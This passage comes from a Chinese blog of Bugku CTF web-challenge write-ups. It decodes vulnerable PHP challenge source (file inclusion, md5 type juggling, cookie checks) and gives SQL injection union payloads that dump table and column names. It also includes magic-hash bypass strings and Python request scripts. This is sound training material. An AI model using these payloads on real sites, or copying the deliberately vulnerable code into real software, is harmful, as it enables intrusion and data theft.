<div class="hljs"><pre><code class="hljs llvm">PGh<span class="hljs-number">0</span>bWw+DQogICAgPHRpdGxlPkJ<span class="hljs-number">1</span>Z<span class="hljs-number">2</span>t<span class="hljs-number">1</span>LWN<span class="hljs-number">0</span>ZjwvdGl<span class="hljs-number">0</span>bGU+DQogICAgDQo<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocA<span class="hljs-number">0</span>KCWVycm<span class="hljs-number">9</span>yX<span class="hljs-number">3</span>JlcG<span class="hljs-number">9</span>ydGluZygwKTsNCglpZighJF<span class="hljs-number">9</span>HRVRbZmlsZV<span class="hljs-number">0</span>pe<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>gJzxhIGhyZWY<span class="hljs-number">9</span>I<span class="hljs-keyword">i4</span>vaW<span class="hljs-number">5</span>kZXgucGhwP<span class="hljs-number">2</span>ZpbGU<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>hvdy<span class="hljs-number">5</span>waHAiPmNsaWNrIG<span class="hljs-number">1</span>lPyBubzwvYT<span class="hljs-number">4</span>nO<span class="hljs-number">30</span>NCgkkZmlsZT<span class="hljs-number">0</span>kX<span class="hljs-number">0</span>dFVFsnZmlsZSddOw<span class="hljs-number">0</span>KCWlmKHN<span class="hljs-number">0</span>cnN<span class="hljs-number">0</span>cigkZmlsZSwiL<span class="hljs-keyword">i4</span>vIil<span class="hljs-number">8</span>fHN<span class="hljs-number">0</span>cmlzdHIoJGZpbGUsICJ<span class="hljs-number">0</span>cCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJpbnB<span class="hljs-number">1</span>dCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJkYXRhIikpew<span class="hljs-number">0</span>KCQllY<span class="hljs-number">2</span>hvICJPaCBubyEiOw<span class="hljs-number">0</span>KCQlleGl<span class="hljs-number">0</span>KCk<span class="hljs-number">7</span>DQoJfQ<span class="hljs-number">0</span>KCWluY<span class="hljs-number">2</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>ZGUoJGZpbGUpOyANC<span class="hljs-keyword">i8</span>vZmxhZzpmbGFne<span class="hljs-number">2</span>VkdWxjbmlfZWxpZl<span class="hljs-number">9</span>sYWNvbF<span class="hljs-number">9</span>zaV<span class="hljs-number">9</span>zaWh<span class="hljs-number">0</span>fQ<span class="hljs-number">0</span>KPz<span class="hljs-number">4</span>NCjwvaHRtbD<span class="hljs-number">4</span>NCg==</code></pre></div>

<p>解码为</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;
  
&lt;?php
	error_reporting(0);
	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
	$file&#x3D;$_GET[&#39;file&#39;];
	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
		echo &quot;Oh no!&quot;;
		exit();
	&#125;
	include($file); 
&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;
?&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<p>获取flag{edulcni_elif_lacol_si_siht}</p>
<h2 id="请输入密码"><a href="#请输入密码" class="headerlink" title="请输入密码"></a>请输入密码</h2><p>提示了5位数的密码，直接爆破，可用burpsuit的爆破模块</p>
<p><img src="/2020/09/06/bugku1-10/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81.png" srcset="/img/loading.gif" alt></p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开题目后，出现一段代码，应该是md5值，可是解码为空密码</p>
<p>扫描目录<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p>
<p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD1.png" srcset="/img/loading.gif" alt></p>
<p>发现了<code>index.php.bak</code></p>
<blockquote>
<p>这个应该是在编辑这个文件时，自动生成的备份文件；<br>EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；<br>如果编辑后没有什么问题；<br>可以删除.BAK文件             (来自百度)</p>
</blockquote>
<p>下载.bak文件打开后，发现源码，开始审计</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"></span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">   */</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;
ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);
$str = substr($str,<span class="hljs-number">1</span>);
$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);<span class="hljs-comment">//对key进行了过滤</span>
parse_str($str);
<span class="hljs-keyword">echo</span> md5($key1);

<span class="hljs-keyword">echo</span> md5($key2);
<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;<span class="hljs-comment">//这里需要使用md()函数对数组处理时的漏洞</span>
    <span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"取得flag"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>url:<code>http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss</code></p>
<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<div class="hljs"><pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre></div><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD.png" srcset="/img/loading.gif" alt></p>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
  
1' and 1=2 #</code></pre></div>
<p>   不显示内容，可以判断存在注入点</p>
<h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4 #可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4 #</code>可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>-1&apos; union select 1,database(),3,4 #
database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 #

 table:fl4g,sc</code></pre></div><h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #
 skctf_flag</code></pre></div><p> 得到flag</p>
<div class="hljs"><pre><code class="hljs clojure">(<span class="hljs-name">select</span> skctf_flag from skctf_flag.fl4g)</code></pre></div>



<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
url=<span class="hljs-string">'http://120.24.86.145:8002/qiumingshan/'</span>
r=requests.session()
requestpage = r.get(url)
ans=re.findall(<span class="hljs-string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="hljs-comment">#获取表达式</span>
ans=<span class="hljs-string">""</span>.join(ans)<span class="hljs-comment">#列表转为字符串</span>
ans=ans[:<span class="hljs-number">-2</span>]<span class="hljs-comment">#去掉最后的=?</span>
post=eval(ans)<span class="hljs-comment">#计算表达式的值</span>
data=&#123;<span class="hljs-string">'value'</span>:post&#125;<span class="hljs-comment">#构造post的data部分</span>
flag=r.post(url,data=data)
print(flag.text)</code></pre></div>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>sql</tag>
        <tag>弱类型</tag>
        <tag>域名解析</tag>
        <tag>爆破</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku刷题记录2</title>
    <url>/2020/09/10/bugku1/</url>
    <content><![CDATA[<h1 id="bugku刷题记录2"><a href="#bugku刷题记录2" class="headerlink" title="bugku刷题记录2"></a>bugku刷题记录2</h1><a id="more"></a>





<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
<p>抓包看了看，惊喜的发现了flag字段</p>
<p><img src="/2020/09/10/bugku1/%E9%80%9F%E5%BA%A61.png" srcset="/img/loading.gif" alt></p>
<p>一段base64 解码后为<code>NDQyMDIy</code></p>
<p>提交发现并不对。。。看来另有玄机</p>
<p>多go几次后发现了flag值一直在变，并且有一段提示</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>用post方法提交你所发现的内容，只好使用脚本（不会写）</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
url=<span class="hljs-string">"http://120.24.86.145:8002/web6/"</span>
r=requests.session()
headers=r.get(url).headers<span class="hljs-comment">#因为flag在消息头里</span>
 
mid=base64.b64decode(headers[<span class="hljs-string">'flag'</span>])
mid=mid.decode()<span class="hljs-comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span>
 
flag = base64.b64decode(mid.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#获得flag:后的值</span>
data=&#123;<span class="hljs-string">'margin'</span>:flag&#125;
<span class="hljs-keyword">print</span> (r.post(url,data).text)<span class="hljs-comment">#post方法传上去</span></code></pre></div>

<p><img src="/2020/09/10/bugku1/headers.png" srcset="/img/loading.gif" alt></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
<p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
<p><img src="/2020/09/10/bugku1/cookie1.png" srcset="/img/loading.gif" alt></p>
<p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url1 = <span class="hljs-string">"http://123.206.87.240:8002/web11/index.php?line="</span>
url2 = <span class="hljs-string">"&amp;filename=aW5kZXgucGhw"</span>
mysession = requests.session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):    
    r = mysession.get(url1+str(i)+url2)    
print(r.text)</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);

$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])?$_GET[<span class="hljs-string">'filename'</span>]:<span class="hljs-string">""</span>);

$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'line'</span>])?intval($_GET[<span class="hljs-string">'line'</span>]):<span class="hljs-number">0</span>;

<span class="hljs-keyword">if</span>($file==<span class="hljs-string">''</span>) header(<span class="hljs-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);

$file_list = <span class="hljs-keyword">array</span>(

<span class="hljs-string">'0'</span> =&gt;<span class="hljs-string">'keys.txt'</span>,

<span class="hljs-string">'1'</span> =&gt;<span class="hljs-string">'index.php'</span>,

);

 

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'margin'</span>]==<span class="hljs-string">'margin'</span>)&#123;       <span class="hljs-comment">//看这里</span>

$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">'keys.php'</span>;

&#125;

 

<span class="hljs-keyword">if</span>(in_array($file, $file_list))&#123;

$fa = file($file);

<span class="hljs-keyword">echo</span> $fa[$line];

&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
<p><img src="/2020/09/10/bugku1/cookie2.png" srcset="/img/loading.gif" alt="bp"></p>
<p><img src="/2020/09/10/bugku1/cookie3.png" srcset="/img/loading.gif" alt="hackbar"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
<p><img src="/2020/09/10/bugku1/never2.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div>

<p>base64解码后为url编码</p>
<div class="hljs"><pre><code class="hljs angelscript">%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>header%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>Location%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>hello.php%<span class="hljs-number">3</span>Fid%<span class="hljs-number">3</span>D1%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>exit%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>a%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>b%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>stripos%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27.</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>echo%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span><span class="hljs-keyword">return</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>data%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-symbol">20@</span>file_get_contents%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>r%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>data%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>bugku%<span class="hljs-number">20</span><span class="hljs-keyword">is</span>%<span class="hljs-number">20</span>a%<span class="hljs-number">20</span>nice%<span class="hljs-number">20</span>plateform%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D0%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>strlen%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3E5</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>eregi%<span class="hljs-number">28</span>%<span class="hljs-number">22111</span>%<span class="hljs-number">22.</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">221114</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>D4%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>require%<span class="hljs-number">28</span>%<span class="hljs-number">22f</span>4l2a3g.txt%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aelse%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>print%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>give%<span class="hljs-number">20</span>up%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E</code></pre></div>

<p>url解码为源码</p>
<p><img src="/2020/09/10/bugku1/never1.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
f(!$_GET[<span class="hljs-string">'id'</span>])
&#123;
	header(<span class="hljs-string">'Location: hello.php?id=1'</span>);
	<span class="hljs-keyword">exit</span>();
&#125;
$id=$_GET[<span class="hljs-string">'id'</span>];
$a=$_GET[<span class="hljs-string">'a'</span>];
$b=$_GET[<span class="hljs-string">'b'</span>];
<span class="hljs-keyword">if</span>(stripos($a,<span class="hljs-string">'.'</span>))
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'no no no no no no no'</span>;
	<span class="hljs-keyword">return</span> ;
&#125;
$data = @file_get_contents($a,<span class="hljs-string">'r'</span>);
<span class="hljs-keyword">if</span>($data==<span class="hljs-string">"bugku is a nice plateform!"</span> <span class="hljs-keyword">and</span> $id==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen($b)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">"111"</span>.substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">"1114"</span>) <span class="hljs-keyword">and</span> substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
&#123;
	<span class="hljs-keyword">require</span>(<span class="hljs-string">"f4l2a3g.txt"</span>); <span class="hljs-comment">//注意这里，flag应该藏在这里</span>
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>果然藏在f4l2a3g.txt</p>
<p><img src="/2020/09/10/bugku1/never.png" srcset="/img/loading.gif" alt></p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
<p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
<h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
highlight_file(<span class="hljs-string">'2.php'</span>);
$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;
$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);
<span class="hljs-keyword">if</span>( $IM )&#123; 
 <span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);
&#125;</code></pre></div>



<p><code>preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<p>重点在这句话上，考点为正则表达式</p>
<blockquote>
<p><strong>定界符：</strong>/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
<p><strong>. （一个点）：</strong>表示可以匹配任何字符；</p>
<p><strong>*  ：</strong>前面的字符重复零次或多次；</p>
<p><strong>{n,m} ：</strong>前面的字符重复4~7次；</p>
<p><strong>\ （反斜线）：</strong>后面的字符被转义；</p>
<p><strong>[a-z] ：</strong>在a到z中匹配 ；</p>
<p><strong>[[:punct:]] ：</strong>匹配任何标点符号；</p>
<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感；</p>
</blockquote>
<p>因此可以写出符合要求的字符穿</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">keyakey22222key:</span><span class="hljs-meta-keyword">/a/</span>aaakeyb!</code></pre></div>

<p><img src="/2020/09/10/bugku1/%E6%AD%A3%E5%88%99.png" srcset="/img/loading.gif" alt></p>
<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
<p>你是从google来的吗</p>
<p>考察http头中的referer参数</p>
<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></strong> </p>
<p>那么就抓包修改referer这个参数</p>
<p><code>Referer: https://www.google.com/</code>,直接go即可</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>源码</p>
<div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div>

